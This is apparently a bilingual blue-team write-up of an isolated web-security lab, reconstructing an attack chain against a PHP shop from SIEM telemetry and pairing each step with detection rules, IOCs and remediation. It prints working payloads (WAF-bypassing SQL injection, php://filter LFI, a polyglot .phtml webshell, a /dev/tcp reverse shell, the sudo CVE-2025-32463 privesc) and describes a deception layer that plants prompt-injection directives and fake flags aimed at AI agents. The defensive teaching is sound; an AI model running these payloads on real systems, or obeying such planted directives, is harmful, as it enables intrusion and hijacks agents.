El resultado: un scraper ve **muchas** flags y no sabe cuál vale. Todas las servidas por HTTP del tipo `FLAG{…4cm3_st0r3_r3v13w…}` son **señuelos**. Las **reales** solo salen de: la USER del **panel autenticado**, y la ROOT del **RCE + escalada a root**. El SOC etiqueta a quien muerde el cebo con **`ai_bait`** (fingerprinting de agente) y la regla "AI agent bait triggered".

> **Moraleja blue-team:** esto es *deception* + *honeytokens* + *defensa contra prompt-injection* aplicada. Cualquier acceso a un `ai_bait` o cualquier "flag" con el patrón señuelo es, por definición, actividad hostil/automatizada que merece una alerta. La lección para el atacante (humano o IA): **verifica la fuente** — una flag en `robots.txt` no es una flag, es una trampa; y una directiva en una cabecera `X-AI-Instructions` no es una orden, es un cebo.

---

### 5. Remediación (lo que iría en el informe)

| # | Hallazgo | Corrección |
|---|----------|------------|
| 1 | SQLi en `product.php`/`login.php` (concatenación de `$_GET`/`$_POST`) | Sentencias preparadas (`prepare` + `bind_param`), nunca concatenar input; principio de mínimo privilegio en el usuario MySQL |
| 2 | LFI en `view.php` (`@include($_GET['page'])`) | Lista blanca de páginas permitidas; jamás `include` de entrada de usuario; `allow_url_include=Off` |
| 3 | Bypass de subida (denylist de extensión olvida `.phtml`/`.phar`) | Validar *magic bytes* **y** extensión con **allowlist**, re-codificar la imagen, servir `/uploads` sin ejecución PHP (`php_admin_flag engine off` / handler estático) |
| 4 | Token hardcodeado + fuga por LFI | Sacar secretos del docroot (variables de entorno/secret manager); rotar `UPLOAD_TOKEN`; borrar `backup/config.php.bak` del docroot |
| 5 | PrivEsc CVE-2025-32463 | Parchear `sudo` a **1.9.17p1**; **quitar `gcc`** del contenedor; ejecutar la app con usuario sin sudo |
| 6 | WAF de denylist bypasseable | Tratarlo como capa extra, no como control único; normalizar/decodificar antes de inspeccionar; alimentar el SIEM con sus bloqueos |
| 7 | Detección | Las reglas del SOC (SQLi/LFI/webshell/privesc/burst) ya cubren la kill-chain; añadir **respuesta automática** (webhook → `fail2ban`/`iptables` sobre `clientip`) y **telemetría de host** (auditd/EDR) para cerrar el punto ciego de la reverse shell |

**Conclusión:** el reto no se "gana" con la flag, se gana **reconstruyendo la intrusión desde la telemetría**. La cadena completa —SQLi → LFI → upload → RCE → CVE-2025-32463— es totalmente visible en `weblogs-*` gracias al etiquetado de Logstash, y la capa de engaño convierte a los cebos en una **fuente de alertas** en lugar de en una debilidad. Un buen SOC no necesita la flag: le basta el rastro.

---

<a id="en"></a>

## 🇬🇧 English

### 1. The scenario

`ACME Store` is a PHP+MySQL shop behind Apache, guarded by a mini-WAF (`acme-shield`). All HTTP activity is shipped to an **ELK stack** acting as a SIEM (Filebeat → Logstash → Elasticsearch → Kibana). I approach this as a **blue-team Sherlock**: I don't chase the flag, I chase the **trail** — reconstructing the intrusion from telemetry and showing how the SOC catches each step.

**The seven pieces** (all on the isolated `lab-net`):

| Service | Image | Role |
|---------|-------|------|
| `web` | `php:8.1-apache` | Serves the vulnerable app and **writes** `access.log` / `error.log`. |
| `db` | `mysql:8.0` | `appdb`: `products`, `users`, `customers` (fake PII), `api_keys`. |
| `filebeat` | `filebeat:8.13.4` | Tails the shared `weblogs` volume (read-only) → Logstash:5044, with offset control. |
| `logstash` | `logstash:8.13.4` | Raw line → structured doc: `grok` + `useragent` + `geoip` + **tagging heuristics**. |
| `elasticsearch` | `elasticsearch:8.13.4` | `weblogs-*` (+ `soc-alerts`). |
| `kibana` | `kibana:8.13.4` | Discover, dashboards, and the **alerting** engine. |
| `attacker` | `kalilinux/kali-rolling` | nmap, sqlmap, nikto, gobuster, hydra — source IP **`172.18.0.8`**. |

Apache uses the **combined** `LogFormat` (the `%{User-Agent}i` field is what betrays scanners). The `weblogs-*` mapping (`soc/index-template-weblogs.json`) is deliberate: `clientip` as **`ip`**, `response` as **`integer`** (range queries), `tags`/`agent` as **`keyword`** (aggregable), `request` as **`wildcard`** (cheap `*uploads*phtml*` searches). ELK security is disabled on purpose (`xpack.security.enabled=false`) — never in production.

### 2. The attack chain (what must be detected)

Six chained steps. Real flags are **redacted** (only obtainable by solving the lab):

1. **SQLi with WAF bypass** — `acme-shield` blocks `UNION SELECT`, `-- `, `' OR 1=1`; bypassed with MySQL inline comments `/**/` and line comment `#`. Leaves `500` spikes and `union`/`information_schema` requests.
2. **LFI `php://filter`** — source-discloses `config.php` → hardcoded `UPLOAD_TOKEN`. Leaves `view.php?page=php://filter/...`.
3. **Auth bypass → 🟡 USER flag** — `login.php` with `admin'#` (WAF blocks `-- -`, not `#`) → admin session; `panel.php` shows `FLAG{…redacted…}`.
4. **Upload → webshell** — `upload.php` checks MIME `image/*`, non-`php*` extension, size; bypassed with a `GIF89a` **polyglot** saved as **`.phtml`**.
5. **RCE as `www-data`** — webshell / reverse shell; `www-data` **cannot** read `/root/root.txt`.
6. **PrivEsc → 🔴 ROOT flag** — **CVE-2025-32463** (sudo `chroot` LPE, sudo 1.9.16p1): `sudo -R` parses an attacker-controlled `nsswitch.conf` and loads a malicious `libnss_` **as root** → `FLAG{…redacted…}`.

**Root causes:** direct concatenation of `$_GET['id']` (SQLi), `include($_GET['page'])` without allowlist (LFI), extension *denylist* on upload, and an unpatched compiled `sudo`.

Step by step, with the **real commands** — because the blue team needs to know *what signature each one leaves*:

- **Step 1 — SQLi.** `product.php` concatenates `$id` into a 4-column query. `acme-shield`'s denylist (`union\s+select`, `order\s+by`, `--\s`, …) returns 403; MySQL treats `/**/` as whitespace and `#` as a line comment, so `id=-1/**/union/**/select/**/id,username,password,role/**/from/**/users%23` dumps `users` (→ `admin` / `S3cr3t_FlaG_db_2026`), then `customers` (PII) and `api_keys`. **Detection note:** the pipeline's `sqli_pattern` regex includes `union(\s|%20|\/\*.*\*\/)+select` — it is *comment-aware*, so it sees the `/**/` bypass the WAF misses.
- **Step 2 — LFI.** `@include($_GET['page'])` + `php://filter/convert.base64-encode/resource=config.php` returns `config.php` in base64 → real `UPLOAD_TOKEN = acme_upl_9d4f1c7b8e2a6f05c31d`. (The token in `backup/config.php.bak` is a **decoy**.)
- **Step 3 — Auth bypass.** `login.php` builds `… WHERE username = '$u' AND password = '$p'` and runs both through `waf_inspect()`. `--\s` blocks `admin'-- -`, but not `admin'#` → `is_admin` session; `panel.php` shows the USER flag.
- **Step 4 — Upload.** After session + `hash_equals(UPLOAD_TOKEN…)`, `upload.php` enforces size <200KB, MIME `image/*`, and an extension denylist `['php','php3','php4','php5','php7','pht','phps','htaccess','cgi']` — which **forgets `.phtml`/`.phar`**. A `GIF89a` polyglot saved as `.phtml` passes MIME and runs as PHP: `printf 'GIF89a;\n<?php system($_GET["c"]); ?>' > shell.phtml`. `error.log`: `[upload] guardado uploads/shell.phtml …`.
- **Step 5 — RCE.** Webshell / reverse shell (`?c=bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'`) → `uid=33(www-data)`; cannot read `/root/root.txt`.
- **Step 6 — PrivEsc (CVE-2025-32463).** sudo 1.9.16p1: `sudo -R woot woot` parses a user-controlled `woot/etc/nsswitch.conf` (`passwd: /woot1337`) and loads `libnss_/woot1337.so.2` (built with `gcc -shared -fPIC -Wl,-init,w`, whose constructor does `setreuid(0,0); execl("/bin/bash"…)`) **as root** — even with no sudoers rule. Patched in **1.9.17p1**; needs `gcc` (present). **Detection note:** only visible in `access.log` if run through the webshell `?c=…`; an interactive reverse shell hides it — hence host telemetry (auditd/EDR) is still needed.

### Attack timeline

Reconstructed from `access.log`/`error.log` (combined format, source **`172.18.0.8`**, `23/Jun/2026`):

| Time (UTC) | Event | Request / signal | SIEM tags |
|------------|-------|------------------|-----------|
| `10:40:xx` | Recon | nmap/gobuster → `404` burst | `not_found`, `scanner_ua` |
| `10:41:02` | SQLi probe | `GET /product.php?id=1'` → 500 | `server_error`, `sqli_pattern` |
| `10:41:05` | UNION dump (sqlmap) | `…UNION SELECT …FROM users-- -` → 200 | `scanner_ua`, `sqli_pattern`, `suspicious` |
| `10:41:0x` | SQLi bypass | `id=-1/**/union/**/select/**/…%23` | `sqli_pattern` |
| `10:41:09` | LFI | `view.php?page=…/etc/passwd`, then `php://filter…config.php` | `lfi_pattern` |
| `10:41:1x` | Auth bypass + upload | `POST /login.php` (`admin'#`); `GET /panel.php`; `POST /upload.php` | `admin_area` |
| `10:41:2x` | RCE / privesc | `/uploads/shell.phtml?c=id`, `?c=…/dev/tcp/…`, `?c=…sudo -R…` | `webshell`, `rce`, `privesc` |
| `~10:41` | WAF response | `[acme-shield] BAN …` / `BEHAV-BLOCK …` | `ip_banned`, `bot_throttle` |

The timing itself is an IOC: dozens of high-complexity requests in seconds from one IP.

### 3. Blue team: how the SOC sees it

`logstash/pipeline/apache.conf` parses the combined log with `grok`, normalizes (`useragent`, `geoip`, `response→int`) and tags each request. Every `tag` is a detection signal:

- `scanner_ua` — attack-tool User-Agents (`sqlmap`, `nikto`, `nmap`, `gobuster`, `ffuf`, `nuclei`, `wfuzz`…)
- `sqli_pattern` / `lfi_pattern` / `xss_pattern` / `cmdi_pattern` — payload signatures in the URL (`sqli_pattern` is comment-aware)
- `server_error` (5xx) / `not_found` (404) / `auth_failed` (`/login.php` + 401)
- `admin_area` — `/panel.php`, `/upload.php`
- `webshell` + `rce` — request to `/uploads/*.(phtml|phar|php[3457]?)` → **critical**
- `rce` — `/dev/tcp/`, `bash -i`, `nc -e`, `mkfifo`, `/root/`, `/flag.txt`, ` id `
- `privesc` — `sudo -R`, `nsswitch`, `libnss_`, `woot`, `setreuid`, `LD_PRELOAD`, `base64 -d`, `/usr/local/bin/sudo` → **CVE-2025-32463**
- `waf_block` (403), `ip_banned` (auto-ban, from `error.log`), `bot_throttle`+`agent_behavior` (behavioral), `ai_bait` (agent fingerprint)

Most attack tags also add the cross-cutting **`suspicious`** tag that feeds the "attack burst" threshold. One pipeline gotcha: Filebeat injects its own ECS `agent` object that collides with the grok `agent` (User-Agent) and kills the `useragent` filter, so the pipeline `remove_field`s it **before** parsing — misorder it and you silently stop tagging.

Same sqlmap line, structured:

```json
{
  "@timestamp": "2026-06-23T10:41:05.000Z",
  "clientip": "172.18.0.8", "verb": "GET",
  "request": "/product.php?id=-1 UNION SELECT id,username,password,role FROM users-- -",
  "response": 200, "agent": "sqlmap/1.8#stable",
  "tags": ["scanner_ua", "sqli_pattern", "suspicious"]
}
```

**Alerting rules** (`soc/provision.py`, Kibana `.es-query`, 5-min window / 30-s interval, idempotent, writing to `soc-alerts` via an `.index` connector): SQLi (`sqli_pattern`>0, *critical*), LFI (`lfi_pattern`>0, high), XSS (`xss_pattern`>0, high), scanner (`scanner_ua`>3, medium), dir brute-force (`404`>15, medium), 5xx spike (>3, high), login brute-force (`auth_failed`>5, high), **Webshell** (`webshell`>0, *critical*), **Reverse shell** (`rce`>0, *critical*), **PrivEsc CVE-2025-32463** (`privesc`>0, *critical*), admin-panel (`admin_area`>0, high), **Attack burst** (`suspicious`>9 / **10 min**, *critical*), IP auto-banned (`ip_banned`>0, *critical*), WAF blocks (`waf_block`>4, medium), AI bait (`ai_bait`>0, low), agent throttled (`bot_throttle`>0, high).

**Analyst KQL:**

```text
tags : "webshell" or tags : "rce"   # code execution — check first
tags : "privesc"                    # CVE-2025-32463 escalation attempt
tags : "admin_area"                 # panel/uploader access
tags : "ip_banned"                  # who the WAF banned, and hit count
request : "*uploads*phtml*"         # the uploaded webshell
clientip : "172.18.0.8"             # full path of one IP
```

Triage flow: **1)** any `webshell`/`rce`? (contain) → **2)** pivot by `clientip` → **3)** confirm entry point (`sqli_pattern`/`lfi_pattern`) → **4)** measure blast radius (did it reach `privesc`?).

### Detection rules (SIEM)

Two layers, real snippets. **(a) Tagging** — the comment-aware SQLi rule and the webshell/privesc rules from `apache.conf`:

```ruby
if [request] =~ /(?i)(union(\s|%20|\/\*.*\*\/)+select|information_schema|\bor\b\s+1=1|sleep\(|--\s|%27)/ {
  mutate { add_tag => [ "sqli_pattern", "suspicious" ] } }
if [request] =~ /(?i)\/uploads\/.*\.(phtml|phar|php[3457]?)/ {
  mutate { add_tag => [ "webshell", "rce", "suspicious" ] } }
if [request] =~ /(?i)(sudo(\s|%20|\+)+-R|nsswitch|libnss_|woot|setreuid|LD_PRELOAD|\/usr\/local\/bin\/sudo)/ {
  mutate { add_tag => [ "privesc", "rce", "suspicious" ] } }
# error.log -> WAF response
if [message] =~ /\[acme-shield\] BAN/ { grok { match => { "message" => "BAN ip=%{IPORHOST:banned_ip} hits=%{NUMBER:ban_hits:int}" } } mutate { add_tag => [ "ip_banned", "suspicious" ] } }
```

**(b) Alert** — `soc/provision.py` builds each rule with `rule(name, query, threshold, severity, comparator, window)`; a `.es-query` on `weblogs-*` every 30s, over 5m, firing an `.index` action into `soc-alerts`:

```json
{ "@timestamp":"2026-06-23T10:41:26Z", "rule":"Webshell / RCE via upload",
  "severity":"critical", "count":"1", "summary":"matched 1 documents in the last 5m" }
```

**(c) Active response:** add a second `.webhook`/Slack action, or an external watcher reading `soc-alerts` → `iptables`/`fail2ban` on the offending `clientip`. `acme-shield` is app-level fail2ban-lite; the SIEM raises it to network response.

### IOCs / signals

| Type | Indicator |
|------|-----------|
| Source IP | `172.18.0.8` (lab Kali) |
| User-Agents | `sqlmap/1.8#stable`, `gobuster/3.6`, `nikto`, `nmap`, `curl/8.5.0` |
| SQLi URI | `product.php?id=…UNION SELECT…`, `id=-1/**/union/**/select/**/…%23` |
| LFI URI | `view.php?page=../../../../etc/passwd`, `…php://filter/convert.base64-encode/resource=config.php` |
| Auth bypass | `POST /login.php` `username=admin'#` |
| Webshell / privesc | `/uploads/shell.phtml?c=…`, `…?c=…/dev/tcp/…`, `…?c=…sudo -R woot…` |
| Dropped files | `uploads/*.phtml` with `GIF89a` header; `libnss_/woot1337.so.2`; `woot/etc/nsswitch.conf` (`passwd: /woot1337`) |
| error.log | `[acme-shield] BAN …`, `[acme-shield] BEHAV-BLOCK …`, `[upload] guardado …phtml`, `[upload] firma invalida` |
| Honeytoken (real) | `UPLOAD_TOKEN = acme_upl_9d4f1c7b8e2a6f05c31d` (leaked = LFI) |
| Decoy | fake token in `backup/config.php.bak`; `FLAG{…4cm3_st0r3_r3v13w…}` |

### MITRE ATT&CK mapping

| Tactic | Technique | In the attack | Detection |
|--------|-----------|---------------|-----------|
| Reconnaissance | **T1595.003** Wordlist Scanning | gobuster → `404` burst | `not_found` + `scanner_ua` |
| Initial Access | **T1190** Exploit Public-Facing App | SQLi / LFI | `sqli_pattern` / `lfi_pattern` |
| Credential Access | **T1212** Exploitation for Cred Access | UNION dump of `users` | `sqli_pattern` + `server_error` |
| Credential Access | **T1552.001** Credentials in Files | `UPLOAD_TOKEN` via `php://filter` | `lfi_pattern` |
| Defense Evasion | **T1027 / T1140** Obfuscation | WAF bypass `/**/`, `#` | comment-aware `sqli_pattern` |
| Persistence | **T1505.003** Web Shell | `shell.phtml` in `/uploads` | `webshell` (critical) |
| Execution | **T1059.004** Unix Shell | `system($_GET['c'])`, reverse shell | `rce` |
| Command & Control | **T1571** Non-Standard Port | reverse shell `:4444` | `rce` (`/dev/tcp/`) |
| Priv. Escalation | **T1068** Exploitation for PrivEsc (**CVE-2025-32463**) | `sudo -R` + malicious `libnss_` | `privesc` (critical) |
| Defense (Engage) | Decoy Content / Honeytokens | anti-AI bait, fake token | `ai_bait` |

### 4. The defenses

**`acme-shield`** (`web/src/waf.php`) — three layers: (1) signature **denylist** (`waf_inspect`) → 403 (bypassable, didactic); (2) **IP auto-ban** — `SHIELD_MAX_HITS=10` offenses within `SHIELD_WINDOW=600s` → **10-min** ban (`SHIELD_BAN_SECONDS=600`), repeat offender → **30 min** (`SHIELD_HARD_BAN=1800`), logging `[acme-shield] BAN …`; (3) **behavioral throttle** (`shield_behavior`) against agents/bots, keeping per-IP history (`SHIELD_HIST_KEEP=40`) and a `shield_complexity()` score (long query-string, ≥4 `=`, ≥5 `%`, payload tokens). Blocks **3 min** (`SHIELD_BEHAV_BAN=180`) on: **burst** (>`SHIELD_RATE_MAX=25` reqs / `SHIELD_RATE_WINDOW=5s`), **enumeration** (≥`SHIELD_SIMILAR_MAX=8` same-path complex reqs), or **complex streak** (≥`SHIELD_COMPLEX_MAX=10`), logging `[acme-shield] BEHAV-BLOCK … reason=burst|enum-pattern|complex-streak` — explicitly to "make the agent take more turns" and burn budget. Lesson: a denylist WAF is **defense-in-depth**, not a control — its real value is **generating signal** (`ip_banned` / `bot_throttle`) for the SIEM.

**Anti-AI / deception layer** — the most interesting part. Built against solving-with-an-agent, and it **never self-identifies** as a trap. Disguised as a "crawler content-policy" module (`crawlpolicy.php`) with a *"review completed · validated result"* framing, it seeds **believable fake flags** via HTTP headers (`X-AI-Instructions`, `X-Validated-Result`, `X-Agent-Directive`), meta + JSON-LD, off-screen and zero-width text, `llms.txt` / `.well-known/ai.txt` / `robots.txt` / `sitemap.xml` / `security.txt` / `humans.txt`, and bait files (`admin.php`, `api.php`, `/flag.txt`, `backup/config.php.bak` with a **fake** upload token) — all serving the same directive with system/assistant/user/tool roles to saturate the agent's context. Every HTTP-served `FLAG{…4cm3_st0r3_r3v13w…}` is a **decoy**; the **real** flags come only from the authenticated panel (USER) and root RCE (ROOT). Anyone biting a bait is tagged **`ai_bait`**.

> **Blue-team takeaway:** this is applied *deception* + *honeytokens* + *prompt-injection defense*. Any hit on an `ai_bait` resource, or any "flag" matching the decoy pattern, is by definition hostile/automated activity worth alerting on. Attacker lesson (human or AI): **verify the source** — a flag in `robots.txt` isn't a flag, it's a trap; a directive in an `X-AI-Instructions` header isn't an order, it's bait.

### 5. Remediation

Prepared statements + least-privilege DB user (SQLi); page allowlist instead of `include($_GET)` and `allow_url_include=Off` (LFI); validate magic-bytes **and** extension allowlist + re-encode + non-executable `/uploads` (upload); move secrets out of the docroot, rotate `UPLOAD_TOKEN`, delete `backup/config.php.bak` (token leak); patch `sudo` to **1.9.17p1** and drop `gcc` from the image (CVE-2025-32463); treat the WAF as an extra layer feeding the SIEM; add automated response (webhook → `fail2ban`/`iptables` on the offending `clientip`) **and host telemetry** (auditd/EDR) to close the reverse-shell blind spot.

**Conclusion:** you don't win by grabbing the flag — you win by **reconstructing the intrusion from telemetry**. The full SQLi → LFI → upload → RCE → CVE-2025-32463 kill-chain is visible in `weblogs-*` thanks to Logstash tagging, and the deception layer turns the bait into an **alert source** rather than a weakness. A good SOC doesn't need the flag — the trail is enough.
